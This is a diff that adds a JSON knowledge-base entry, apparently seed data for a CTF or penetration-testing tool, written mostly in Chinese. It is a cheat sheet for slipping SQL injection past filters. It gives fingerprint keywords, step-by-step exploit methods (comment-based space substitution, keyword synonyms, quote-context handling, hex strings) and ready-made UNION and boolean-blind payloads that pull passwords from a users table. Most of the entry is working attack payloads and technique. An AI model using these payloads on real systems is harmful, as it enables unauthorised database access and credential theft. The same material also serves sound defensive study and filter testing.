@@ -1,0 +1,42 @@
+{
+  "id": "web-sqli-filter-bypass",
+  "title": "SQL 注入过滤绕过速查:无空格(/**/)、保留字同义替换(mid/&&/or)、双引号上下文",
+  "vuln_pattern": "注入点存在但应用层过滤了空格/特定保留字(and|where|like|substring|limit|null...)。绕过靠三件套:内联注释当空格、保留字同义词、以及先确认拼接上下文的引号类型——过滤表几乎从不覆盖全部同义词",
+  "fingerprint": [
+    "sql filter bypass",
+    "过滤绕过",
+    "waf bypass",
+    "inline comment",
+    "/**/",
+    "no space",
+    "无空格",
+    "空白过滤",
+    "keyword filtered",
+    "保留字过滤",
+    "mid()",
+    "同义替换"
+  ],
+  "anti_fingerprint": [
+    "xss",
+    "跨站",
+    "smuggling",
+    "走私"
+  ],
+  "category": "web",
+  "source": "seed",
+  "exploit_steps": [
+    "先定性过滤面:发探针看哪类被拦(整串 exit / 静默清空 / 报错)。逐类试:空格、双空格、注释、括号、union、select、and、or、引号。",
+    "空格替代:/**/ 内联注释最通用;制表符 %09、换行 %0a、%0b、%0c 也常存活;括号语法 select(1) 完全免空格。",
+    "保留字同义表(被拦->可用):AND->&&;OR->||;substring/substr->mid();limit->(配合 offset 语法或嵌套子查询);null->(空串/0);like->rlike 或 =;where->(HAVING 或直接省略,用 UNION 后列对齐);space->/**/。",
+    "双引号上下文:拼接处是 \"...\" 时注入体内用单引号字符串,反之亦然;引号被转义时用 CHAR()/hex(0x..) 构造字符串。",
+    "回显优先:若结果页回显某一列(row['username'] 之类),直接 UNION 把目标数据顶到该列(密码/flag 表内容一把出),盲注只在无回显时用;盲注逐字节用 ascii(mid((select ...),i,1)) 配 && 布尔分支。"
+  ],
+  "key_payloads": [
+    "# 无空格 UNION 回显(双引号拼接点):\n\"/**/union/**/select/**/1,password/**/from/**/users/**/where/**/1||\"1\"=\"1\n# && 替代 AND 的布尔盲注:\n\"/**/&&/**/ascii(mid((select/**/password/**/from/**/users/**/limit/**/0,1),1,1))>64/**/&&/**/\"1\"=\"1",
+    "# 引号被转义时字符串走 hex:\nunion select 1,0x666c6167 --"
+  ],
+  "refs": [
+    "PayloadsAllTheThings SQL Injection (WAF bypass 分区)"
+  ],
+  "notes": "同义表覆盖常见黑名单;黑名单没拦 union/select/or/from/mid/ascii 是高频漏网(拦的往往是 and/where/like/substring 这类'老教程词')。"
+}
